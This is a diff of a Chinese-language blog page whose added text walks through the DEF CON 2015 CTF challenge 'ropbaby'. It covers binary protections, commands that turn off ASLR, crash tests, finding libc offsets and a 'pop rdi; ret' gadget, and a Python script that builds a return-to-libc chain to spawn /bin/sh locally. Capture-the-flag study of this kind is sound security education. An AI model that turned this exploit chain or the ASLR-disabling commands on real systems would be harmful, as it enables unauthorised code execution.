@@ -79,18 +79,23 @@
 
 
 
-<meta name="description" content="file ELF格式文件 64位LSB：Least Significant Bit. “最低有效位”        小端模式参考：https://www.cnblogs.com/gklovexixi/p/5879802.htmlversion 1(SYSV) pie Position-Independent-Executable能用来创建介于共享库和通常可执行代码之间的代码–能像共享库一样可重分配">
+<meta name="description" content="defcon2015 ropbaby detail analysis二进制漏洞是可执行文件（PE、ELF文件等）因编码时考虑不周，造成的软件执行了非预期的功能。 程序分析：file命令查看文件信息:123456789ELF格式文件 64位  LSB：（Least Significant Bit）： 最低有效位,小端模式version 1(SYSV)： 缩写SystemV Unix经典版本pie P">
 <meta name="keywords" content="CTF">
 <meta property="og:type" content="article">
-<meta property="og:title" content="defcon 2015 ropbaby analyze">
+<meta property="og:title" content="defcon 2015 ropbaby detailed Analysis">
 <meta property="og:url" content="http://yoursite.com/2018/08/04/defcon-2015-ropbaby/index.html">
 <meta property="og:site_name" content="expbuf">
-<meta property="og:description" content="file ELF格式文件 64位LSB：Least Significant Bit. “最低有效位”        小端模式参考：https://www.cnblogs.com/gklovexixi/p/5879802.htmlversion 1(SYSV) pie Position-Independent-Executable能用来创建介于共享库和通常可执行代码之间的代码–能像共享库一样可重分配">
+<meta property="og:description" content="defcon2015 ropbaby detail analysis二进制漏洞是可执行文件（PE、ELF文件等）因编码时考虑不周，造成的软件执行了非预期的功能。 程序分析：file命令查看文件信息:123456789ELF格式文件 64位  LSB：（Least Significant Bit）： 最低有效位,小端模式version 1(SYSV)： 缩写SystemV Unix经典版本pie P">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-08-04T07:29:39.860Z">
+<meta property="og:image" content="https://note.youdao.com/favicon.ico">
+<meta property="og:image" content="https://note.youdao.com/favicon.ico">
+<meta property="og:image" content="https://note.youdao.com/favicon.ico">
+<meta property="og:image" content="https://note.youdao.com/favicon.ico">
+<meta property="og:updated_time" content="2018-08-05T11:07:21.018Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="defcon 2015 ropbaby analyze">
-<meta name="twitter:description" content="file ELF格式文件 64位LSB：Least Significant Bit. “最低有效位”        小端模式参考：https://www.cnblogs.com/gklovexixi/p/5879802.htmlversion 1(SYSV) pie Position-Independent-Executable能用来创建介于共享库和通常可执行代码之间的代码–能像共享库一样可重分配">
+<meta name="twitter:title" content="defcon 2015 ropbaby detailed Analysis">
+<meta name="twitter:description" content="defcon2015 ropbaby detail analysis二进制漏洞是可执行文件（PE、ELF文件等）因编码时考虑不周，造成的软件执行了非预期的功能。 程序分析：file命令查看文件信息:123456789ELF格式文件 64位  LSB：（Least Significant Bit）： 最低有效位,小端模式version 1(SYSV)： 缩写SystemV Unix经典版本pie P">
+<meta name="twitter:image" content="https://note.youdao.com/favicon.ico">
 
 
 
@@ -126,7 +131,7 @@
 
 
 
-  <title>defcon 2015 ropbaby analyze | expbuf</title>
+  <title>defcon 2015 ropbaby detailed Analysis | expbuf</title>
   
 
 
@@ -280,7 +285,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">defcon 2015 ropbaby analyze</h1>
+          <h1 class="post-title" itemprop="name headline">defcon 2015 ropbaby detailed Analysis</h1>
         
 
         <div class="post-meta">
@@ -352,19 +357,38 @@
       
 
       
-        <p>file</p>
-<p>ELF格式文件 64位<br>LSB：Least Significant Bit. “最低有效位”        小端模式<br>参考：<a href="https://www.cnblogs.com/gklovexixi/p/5879802.html" target="_blank" rel="external">https://www.cnblogs.com/gklovexixi/p/5879802.html</a><br>version 1(SYSV)</p>
-<p>pie Position-Independent-Executable<br>能用来创建介于共享库和通常可执行代码之间的代码–能像共享库一样可重分配地址的程序</p>
-<p>dynamically linked</p>
-<p>interpreter</p>
-<p>/lib64/ld-linux-x86-64.so.2</p>
-<p>for GUN/Linux 2.6.24</p>
-<p>stripped</p>
-<p>checksec r0pbaby</p>
-<p>strings -a -tx libc-2.27.so | grep /bin/sh</p>
-<p>objdump -T libc-2.27.so|grep /bin/sh</p>
-<p>堆栈</p>
-<p>rop</p>
+        <h1 id="defcon2015-ropbaby-detail-analysis"><a href="#defcon2015-ropbaby-detail-analysis" class="headerlink" title="defcon2015 ropbaby detail analysis"></a>defcon2015 ropbaby detail analysis</h1><p>二进制漏洞是可执行文件（PE、ELF文件等）因编码时考虑不周，造成的软件执行了非预期的功能。</p>
+<h2 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h2><h6 id="file命令查看文件信息"><a href="#file命令查看文件信息" class="headerlink" title="file命令查看文件信息:"></a>file命令查看文件信息:</h6><p><img src="https://note.youdao.com/favicon.ico" alt="image"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ELF格式文件 64位  </span><br><span class="line">LSB：（Least Significant Bit）： 最低有效位,小端模式</span><br><span class="line">version 1(SYSV)： 缩写SystemV Unix经典版本</span><br><span class="line">pie Position-Independent-Executable ：</span><br><span class="line">能用来创建介于共享库和通常可执行代码之间的代码–能像共享库一样可重分配地址的程序.：</span><br><span class="line">dynamically linked：动态链接方式</span><br><span class="line">interpreter：ELF 规格要求,假如 PT_INTERP 存在的话,操作系统必须创建这个 interpreter文件的运行映射，interpreter /lib64/ld-linux-x86-64.so.2：so库文件来定位和加载动态库,如下↓</span><br><span class="line">for GUN/Linux 2.6.24：内核 2.6.24.so库</span><br><span class="line">stripped ：剔除了符号表信息</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://note.youdao.com/favicon.ico" alt="image"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">使用gdb 自带checksec查看文件安全策略，也可自己git单独下载</span><br><span class="line">三项安全机制开启：NX	PIE	Fortify</span><br><span class="line">1. Fority：其实是相对简单的检查，用于检查是否存在缓冲区溢出的错误。&lt;/br&gt;</span><br><span class="line">1. NX：NX即No-eXecute（不可执行）的意思，类似于indows下DEP</span><br><span class="line">基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不去执行恶意指令。</span><br><span class="line">&lt;/br&gt;</span><br><span class="line">1. PIE：类似于Windows中的ASLR，可以防范基于Ret2libc方式的针对DEP的攻击。A</span><br><span class="line">内存地址随机化机制（address space layout randomization)，有以下三种情况&lt;/br&gt;</span><br><span class="line">0 - 表示关闭进程地址空间随机化。&lt;/br&gt;</span><br><span class="line">1 - 表示将mmap的基址，stack和vdso页面随机化。&lt;/br&gt;</span><br><span class="line">2 - 表示在1的基础上增加栈（heap）的随机化。&lt;/br&gt;</span><br><span class="line">使用gcc编译器，编译命令可对其进行设置并且可调整PIE强度，不做详细介绍自行了解</span><br></pre></td></tr></table></figure>
+<p><img src="https://note.youdao.com/favicon.ico" alt="image"></p>
+<p>如下命令可关闭PIE <br><br>sysctl -w kernel.randomize_va_space=0 <br><br>echo “0” &gt; /proc/sys/kernel/randomize_va_space</p>
+<h2 id="开始调试："><a href="#开始调试：" class="headerlink" title="开始调试："></a>开始调试：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">运行尝试寻找崩溃点</span><br><span class="line">功能1，获得libc的基址  libc.so.6: 0x00007FFFF7FB04F0</span><br><span class="line">功能2，获得函数的地址 Symbol system: 0x00007FFFF7E315D0</span><br><span class="line">功能3，输入的地方，可能存在问题</span><br><span class="line"></span><br><span class="line">功能点3发现崩溃点，buf大于8以上可能造成缓冲区溢出，并生成字符串测试崩溃</span><br><span class="line"></span><br><span class="line">崩溃在 [#0] 0x555555554eb3 → ret ，如果不在调试器中运行程序会提示段错误．</span><br><span class="line">查看rsp用户空间堆栈指针，要返回的是 bbbbbbbb 非法地址，x64程序前两位需为00</span><br><span class="line"></span><br><span class="line">尝试改变ret被覆盖的地址</span><br><span class="line">ulimit -c unlimited 核心转储 调试</span><br><span class="line">echo -ne &apos;3\n32\nAAAAAAAABBBBBB\0\0CCCCCCCCDDDDDDDD\n&apos; | ./ropbaby</span><br><span class="line"></span><br><span class="line">成功改变了ret地址</span><br><span class="line">system地址	0x00007FFFF7E315D0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo -ne &apos;3\n32\nAAAAAAAA\\\\\\\x00CCCCCCCCDDDDDDDD\n&apos; | ./ropbaby</span><br></pre></td></tr></table></figure>
+<h2 id="利用分析："><a href="#利用分析：" class="headerlink" title="利用分析："></a>利用分析：</h2><p>linux_64与linux_86的区别主要有两点：首先是内存地址的范围由32位变成了64位。但是可以使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。其次是函数参数的传递方式发生了改变，x86中参数都是保存在栈上,但在x64中的前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9中，如果还有更多的参数的话才会保存在栈上。</p>
+<p>首先要控制rip地址，/bin/sh放到rdi中，获得 pop rdi 工具</p>
+<p>获得程序都调用哪些so文件,其中是否有存在pop rdi ; ret指令<br>调用system函数来执行/bin/sh<br>以上分析可以或者这些地址,并可以利用这些地址<br>libc_address<br>system_offset<br>binsh_offset</p>
+<p>system_address<br>binsh_address<br>pop_rdi_retaddress</p>
+<p>payload：‘A’*8 + gadget_address + binsh_address + system_address</p>
+<p>x86-64的GCC调用约定将第一个参数放在寄存器rdi中．<br>获得rop地址./rp-osx-x64 –unique -f libc-2.19.so -r 1 | grep “pop rdi”<br>通过ROP绕过 python ROPgadget.py –binary /lib/x86_64-linux-gnu/libc-2.27.so –only “pop|ret”</p>
+<h3 id="寻找so文件中system函数地址与偏移"><a href="#寻找so文件中system函数地址与偏移" class="headerlink" title="寻找so文件中system函数地址与偏移"></a>寻找so文件中system函数地址与偏移</h3><p>方式1：nm -D /lib/x86_64-linux-gnu/libc-2.27.so | grep __libc_system  得出 00000000000435d0<br>方式２：objdump -T /lib/x86_64-linux-gnu/libc-2.27.so | grep system</p>
+<p>方式３：IDA类工具在导出表中查找</p>
+<p>libc的运行时基址，可以通过程序运行时输入得到（libc_base = systemaddress - systemoffset）<br>计算方式：python -c “print ‘Base Address: ‘, hex(0x00007FFFF7E315D0-00000000000435d0)”得出    0x7ffff7dee000:”\177ELF\002\001\001\003”    刚好是libc基地地址</p>
+<h3 id="寻找so文件中-bin-sh的地址与偏移获得"><a href="#寻找so文件中-bin-sh的地址与偏移获得" class="headerlink" title="寻找so文件中/bin/sh的地址与偏移获得"></a>寻找so文件中/bin/sh的地址与偏移获得</h3><p>方式1：<br>gdb find  /b find /b 0x7ffff7dee000,0x7ffff7fa7000,’/‘,’b’,’i’,’n’,’/‘,’s’,’h’<br>得到 0x7ffff7f6d573:    “/bin/sh”</p>
+<p>方式2：<br>strings -a -tx /lib/x86_64-linux-gnu/libc-2.27.so | grep /bin/sh 得到在so库中的偏移为：17f573 /bin/sh 固定不变 libc基地址+/bin/sh 偏移得到/bin/sh的地址</p>
+<p>方式3：IDA类工具在导出表中查找</p>
+<h3 id="再次验证程序功能1所提供地址"><a href="#再次验证程序功能1所提供地址" class="headerlink" title="再次验证程序功能1所提供地址"></a>再次验证程序功能1所提供地址</h3><p>执行完1，Ctrl+c进入调试器 ， 然后输入info proc map找出libc基址，相当于用 cat /proc/pid/maps</p>
+<p>加载libc的实际地址是 0x7ffff7dee000:”\177ELF\002\001\001\003”</p>
+<p>在Linux系统上，基地址的前4个字节通常是“\ x7fELF”或“\ x7f \ x45 \ x4c \ x46”<br>验证下是否一致，一致．</p>
+<p>程序功能1原来程序功能1提供的是个指向实际的 libc 基地址 0x00007ffff7dee000</p>
+<p>ROPgadget找到rop链<br>0x00000000000224df : pop rdi ; ret</p>
+<p>gadget_address 0x7ffff7e53aaf = 功能2 给出system_address 0x00007FFFF7E315D0 + 找到的 pop rdi ; ret 偏移地址 = 0x00000000000224df</p>
+<p>echo -ne ‘3\n32\nAAAAAAAA\aa\3a\e5\f7\ff\x7f\x00\x00CCCCCCCCDDDDDDDD\n’ | ./ropbaby</p>
+<h2 id="本地利用"><a href="#本地利用" class="headerlink" title="本地利用"></a>本地利用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import struct</span><br><span class="line"></span><br><span class="line">libc_base_addr = 0x00007ffff7dee000</span><br><span class="line">system_offset = 0x00000000000435d0</span><br><span class="line">binsh_offset = 0x0017f573</span><br><span class="line">pop_rdi_ret_offset = 0x000224df</span><br><span class="line"></span><br><span class="line">system_addr = libc_base_addr + system_offset</span><br><span class="line">binsh_addr = libc_base_addr + binsh_offset</span><br><span class="line">pop_rdi_ret_addr = libc_base_addr + pop_rdi_ret_offset</span><br><span class="line"></span><br><span class="line">print &quot;3&quot;   # Option 3: Load ROP CHAIN</span><br><span class="line">print 32    # Size: 32 bytes</span><br><span class="line">print struct.pack(&quot;LLLL&quot;, 0x00AAAAAAAA, pop_rdi_ret_addr, binsh_addr, system_addr)</span><br><span class="line">py=struct.pack(&quot;LLLL&quot;, 0x00AAAAAAAA, pop_rdi_ret_addr, binsh_addr, system_addr)</span><br><span class="line">print repr(py)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; ./gadget.py; cat -;&#125; | ./ropbaby</span><br></pre></td></tr></table></figure>
+<p><img src="https://note.youdao.com/favicon.ico" alt="image"></p>
+<p>savedregs是一个IDA关键字，表示保存的堆栈帧指针和函数返回地址：<br>rop</p>
+<p>ida<br>gda<br>radare2调试</p>
+<p>IDA分析</p>
 
       
     </div>
@@ -459,8 +483,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -543,6 +576,22 @@
       </section>
 
       
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#defcon2015-ropbaby-detail-analysis"><span class="nav-number">1.</span> <span class="nav-text">defcon2015 ropbaby detail analysis</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#程序分析："><span class="nav-number">1.1.</span> <span class="nav-text">程序分析：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#file命令查看文件信息"><span class="nav-number">1.1.0.0.0.1.</span> <span class="nav-text">file命令查看文件信息:</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#开始调试："><span class="nav-number">1.2.</span> <span class="nav-text">开始调试：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用分析："><span class="nav-number">1.3.</span> <span class="nav-text">利用分析：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#寻找so文件中system函数地址与偏移"><span class="nav-number">1.3.1.</span> <span class="nav-text">寻找so文件中system函数地址与偏移</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#寻找so文件中-bin-sh的地址与偏移获得"><span class="nav-number">1.3.2.</span> <span class="nav-text">寻找so文件中/bin/sh的地址与偏移获得</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#再次验证程序功能1所提供地址"><span class="nav-number">1.3.3.</span> <span class="nav-text">再次验证程序功能1所提供地址</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#本地利用"><span class="nav-number">1.4.</span> <span class="nav-text">本地利用</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
 
       
 
@@ -569,7 +618,7 @@
 
   <div class="powered-by">
   <i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
-    Visitor:<span id="busuanzi_value_site_uv">  | </span>
+    Visitor:01<span id="busuanzi_value_site_uv">  | </span>
   </span>
   </div> 
   <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://github.com/X0buf">Hexo</a> 强力驱动</div>
